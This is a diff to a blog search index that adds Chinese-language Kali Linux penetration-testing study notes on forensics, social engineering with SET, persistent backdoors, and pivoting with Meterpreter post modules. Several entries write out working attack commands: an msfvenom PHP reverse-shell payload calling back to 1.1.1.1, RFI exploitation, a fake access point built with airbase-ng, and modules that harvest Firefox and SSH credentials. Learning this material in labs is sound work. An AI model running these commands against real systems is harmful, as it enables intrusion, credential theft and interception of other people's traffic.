@@ -4,6 +4,114 @@
   
     
     <entry>
+      <title>计算机取证</title>
+      <link href="/2020/12/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
+      <url>/2020/12/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/</url>
+      
+        <content type="html"><![CDATA[<h4 id="取证科学"><a href="#取证科学" class="headerlink" title="取证科学"></a>取证科学</h4><ul><li>Forensic<ul><li>法医的、用于法庭的、辩论学、法医学</li><li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法</li></ul></li><li>CSI：物理取证<ul><li>指纹、DNA、弹道、血迹</li><li>物理取证的理论基础是物质交换原则</li></ul></li><li>关注：数字取证/计算机取证/电子取证<ul><li>智能设备、计算机、手机平板、IoT、有线及无线通信、数据存数</li></ul></li></ul><a id="more"></a><h4 id="通用原则"><a href="#通用原则" class="headerlink" title="通用原则"></a>通用原则</h4><ul><li>维护证据完整性<ul><li>数字取证相比物理取证，可以有无限数量的拷贝进行分析。</li><li>数字hash值验证数据完整性</li></ul></li><li>维护监管链<ul><li>物理证物保存在证物袋中，每次取出使用严格记录，避免污染破坏</li><li>数字证物原始版写保护，使用拷贝进行分析</li></ul></li><li>标准的操作步骤<ul><li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li></ul></li><li>取证分析全部过程记录文档</li></ul><h4 id="数字取证者的座右铭"><a href="#数字取证者的座右铭" class="headerlink" title="数字取证者的座右铭"></a>数字取证者的座右铭</h4><ul><li>不要破坏数据现场（看似简单、几乎无法实现）</li><li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li><li>系统内存是主要的非易失性存储介质取证对象，不修改无法获取其中数据</li><li>非易失性存储介质通常使用完整镜像拷贝保存</li></ul><h4 id="证据搜索"><a href="#证据搜索" class="headerlink" title="证据搜索"></a>证据搜索</h4><ul><li>数据</li><li>信息</li><li>证据</li></ul><h4 id="作为安全从业者"><a href="#作为安全从业者" class="headerlink" title="作为安全从业者"></a>作为安全从业者</h4><ul><li>通过取证还原黑客入侵轨迹</li><li>作为渗透测试和黑客攻击区分标准</li></ul><h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a>活取证</h4><ul><li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li><li>使用未受感染的干净程序执行取证</li><li>U盘、网络 存储手机到的数据</li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a>死取证</h4><ul><li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）</li></ul><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><ul><li>内存dump工具<ul><li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2017/07/Dumplt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2017/07/Dumplt.zip</a></li><li>内存文件与内存大小接近或者稍微大一点，raw格式</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>社会工程学</title>
+      <link href="/2020/12/29/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
+      <url>/2020/12/29/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
+      
+        <content type="html"><![CDATA[<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><ul><li>SET 工具包大量依赖Metasploit</li><li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li></ul><a id="more"></a><h5 id="四个阶段"><a href="#四个阶段" class="headerlink" title="四个阶段"></a>四个阶段</h5><ul><li>研究：信息收集（WEB、媒体、垃圾桶、物理），确定并研究目标人</li><li>钩子：与目标建立第一次交谈（Hook、下套）</li><li>下手：与目标建立信任并获取信息</li><li>退场：不引起目标怀疑的离开攻击现场</li></ul><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul><li>基于人的社工<ul><li>搭载</li><li>伪造身份</li><li>偷听、窃肩</li><li>反社工</li><li>垃圾桶工程</li></ul></li><li>基于计算机的社工<ul><li>弹出窗口</li><li>内部网络攻击</li><li>钓鱼邮件</li><li>419尼日利亚骗局</li><li>短信诈骗</li></ul></li></ul><h5 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h5><ul><li>站点克隆：1232</li><li>发送钓鱼邮件：112</li><li>web站点攻击向量：1212</li><li>中间文件全部存在 ~/.set目录中</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>后渗透阶段-持久后门</title>
+      <link href="/2020/12/13/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8C%81%E4%B9%85%E5%90%8E%E9%97%A8/"/>
+      <url>/2020/12/13/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8C%81%E4%B9%85%E5%90%8E%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h4><ul><li>metepreter后门<ul><li>run exploit/windows/local/persistence</li><li>run persistence -X</li></ul></li></ul><hr><h4 id="延伸用法"><a href="#延伸用法" class="headerlink" title="延伸用法"></a>延伸用法</h4><ul><li><p>Mimikatz</p></li><li><p>PHP shell</p><a id="more"></a><ul><li>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</li><li>把a.php放在目标机器的web页面</li><li>meterpreter &gt; use multi/handler</li><li>set payload php/meterpreter/reverse_tcp</li><li>run</li><li>当访问php页面是，就触发反弹shell</li></ul></li><li><p>Web Delivery</p><ul><li>利用代码执行漏洞访问攻击者服务器</li><li>use exploit/multi/script/web_delivery</li><li>set target 1</li><li>php -d allow_url_fopen=true -r </li></ul></li></ul><hr><h5 id="RFI远程文件包含"><a href="#RFI远程文件包含" class="headerlink" title="RFI远程文件包含"></a>RFI远程文件包含</h5><ul><li>vi /etc/php5/cgi/php.ini<ul><li>allow_url_fopen=On</li><li>allow_url_include=On</li></ul></li><li>use exploit/unix/webapp/php_include</li><li>set RHOST、</li><li>set PATH /dvwa/vulnerabilities/fi/</li><li>set PHPURI /?page=XXpathXX</li><li>set HEADERS </li></ul><hr><h4 id="Karmetasploit"><a href="#Karmetasploit" class="headerlink" title="Karmetasploit"></a>Karmetasploit</h4><ul><li><p>伪造AP、嗅探密码、截获数据、浏览器攻击</p></li><li><p>wget <a href="https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt" target="_blank" rel="noopener">https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</a></p></li><li><p>安装其它依赖包</p><ul><li>gem install activerecord sqlite3-ruby</li></ul></li><li><p>基础架构安装配置</p><ul><li>apt-get install isc-dhcp-server</li><li>cat /etc/dhcp/dhcpd.conf<ul><li>option domain-name-server 10.0.0.1; #伪造的ap的地址</li><li>max-lease-time 72; #租约期限短，用户断网后快速恢复</li><li>authoritative#如果自己不启动授权，别人启动授权，自己的dhcp会失效</li><li>log-facility local7;</li><li>subnet 10.0.0.0 netmask 255.255.255.0{</li><li>range 10.0.0.10 10.0.0.200;</li><li>option routers 10.0.0.1;</li><li>option domain-name-servers 10.0.0.1;#子网段内的dnsServer，如果和全局不同，则可以指定。</li><li>}</li></ul></li></ul></li><li><p>伪造AP</p><ul><li><p>airmon-ng start wlan0</p></li><li><p>airbase-ng -P -C 30 -e “FREE” -v wlan0mon #</p></li><li><p>ifconfig -a</p></li><li><p>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</p></li><li><p>dhcpd -cf /etc/dhcp/dhcpd.conf at0</p></li></ul></li><li><p>当有设备连接后</p><ul><li>msfconsole -q -r karma.rc_.txt</li><li>可以看到流量信息，但用户上不了网</li><li>gedit karma.rc_.txt<ul><li>删掉db_connect、setg、set LPORT</li><li>加上auxiliary/server/browser_autorpwn</li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>后渗透阶段-跳板、POST模块</title>
+      <link href="/2020/12/12/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E8%B7%B3%E6%9D%BF%E3%80%81POST%E6%A8%A1%E5%9D%97/"/>
+      <url>/2020/12/12/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E8%B7%B3%E6%9D%BF%E3%80%81POST%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><h5 id="autoroute"><a href="#autoroute" class="headerlink" title="autoroute"></a>autoroute</h5><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其它内网计算机看来访问全部来自跳板机</li><li>run autoroute -s 2.2.2.0/24 #不能访问外网的目标网段</li><li>run autoroute -p</li><li>use auxiliary/scanner/portscan/tcp</li></ul><a id="more"></a><hr><h5 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h5><ul><li>利用已经被控计算机，在kali与攻击目标之间实现端口转发</li><li>portfwd add -L LIP -l LPORT  -r RIP -p RPORT</li><li>portfwd list /delete/flush</li></ul><hr><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><ul><li>use exploit/multi/handler</li><li>set exitonsession false当建立一个session后不会退出</li><li>run -j -z</li></ul><hr><ul><li><p>meterpreter &gt; </p></li><li><p>run post/windows/gather/arp_scanner RHOSTS=192.168.43.0/24</p></li><li><p>run post/windows/gather/checkvm</p></li><li><p>run post/windows/gather/credentials/credential_collector</p></li><li><p>run post/windows/gather/enum_applications</p></li><li><p>run post/windows/gather/enum_logged_on_users</p></li><li><p>run post/windows/gather/enum_snmp</p></li><li><p>run post/multi/recon/local_exploit_suggester检查可用的本地提权漏洞模块</p></li><li><p>run post/windows/manage/delete_user USERNAME=flower</p></li><li><p>run post/multi/gather/firefox_creds 收集firefox缓存的账户密码</p></li><li><p>run post/multi/gather/ssh_creds 收集ssh身份认证信息</p></li><li><p>run post/multi/gather/check_malware REMOTEFILE=c:\\windows\\system32\\cmd.exe</p></li><li><p>run hostsedit -e 1.1.1.1 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 编辑hosts文件</p></li></ul><hr><ul><li><p>自动执行meterpreter脚本</p><ul><li><p>set AutoRunScript migrate -N explorer.exe</p></li><li><p>set InitialAutoRunScript checkvm</p></li></ul></li><li><p>自动执行post模块</p><ul><li>set InitialAutoRunScript migrate -n explorer.exe</li><li>set AutoRunScript post/windows/gather/dumplinks收集最近打开的文档（首先要先切换到目标用户，migrate目标用户所在进程）</li><li>InitialAutoRunScript 先于 AutoRunScript执行</li></ul></li></ul><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>后渗透阶段-嗅探、痕迹消除</title>
       <link href="/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/"/>
       <url>/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/</url>
